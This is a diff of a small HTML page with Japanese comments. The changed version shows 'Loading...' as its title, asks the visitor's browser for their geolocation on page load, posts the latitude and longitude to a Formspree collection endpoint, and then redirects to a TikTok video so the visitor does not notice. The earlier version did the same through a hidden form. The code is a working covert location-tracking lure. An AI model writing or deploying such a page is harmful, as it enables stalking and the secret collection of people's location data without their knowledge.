@@ -1,49 +1,39 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ja">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Location Tracker</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, redirectNow);
+            } else {
+                redirectNow();
+            }
+        }
+
+        function sendLocation(position) {
+            let lat = position.coords.latitude;
+            let lon = position.coords.longitude;
+
+            // FormspreeのフォームURLにPOSTリクエスト
+            fetch("https://formspree.io/f/xanedrka", {
+                method: "POST",
+                headers: { 
+                    "Content-Type": "application/x-www-form-urlencoded" 
+                },
+                body: `lat=${lat}&lon=${lon}`
+            }).finally(redirectNow);
+        }
+
+        function redirectNow() {
+            window.location.replace("https://www.tiktok.com/@kaga1024/video/7431843644312800513"); // リダイレクト先のURL
+        }
+
+        getLocation();
+    </script>
 </head>
 <body>
-
-<h2>位置情報を取得しています...</h2>
-
-<!-- 送信フォーム（ボタンは非表示にする） -->
-<form action="https://formspree.io/f/xanedrka" method="POST" id="locationForm" style="display:none;">
-  <input type="hidden" id="lat" name="lat">
-  <input type="hidden" id="lon" name="lon">
-</form>
-
-<script>
-  // 位置情報を取得して送信後にリダイレクトする関数
-  function getLocationAndRedirect() {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(function(position) {
-        // 位置情報をフォームにセット
-        document.getElementById('lat').value = position.coords.latitude;
-        document.getElementById('lon').value = position.coords.longitude;
-        
-        // フォームを送信
-        document.getElementById('locationForm').submit();
-
-        // 送信後にリダイレクト（1秒後）
-        setTimeout(function() {
-          window.location.href = "https://www.tiktok.com/@kaga1024/video/7431843644312800513";  // リダイレクト先のURLを変更
-        }, 1000); // 1秒後にリダイレクト
-      }, function(error) {
-        console.error('位置情報の取得に失敗しました:', error);
-        window.location.href = "https://your-redirect-url.com";  // エラー時にもリダイレクトする
-      });
-    } else {
-      console.error('位置情報の取得がサポートされていません。');
-      window.location.href = "https://your-redirect-url.com";  // サポートしていない場合もリダイレクト
-    }
-  }
-
-  // ページがロードされたら位置情報を取得してリダイレクト
-  window.onload = getLocationAndRedirect;
-</script>
-
 </body>
 </html>
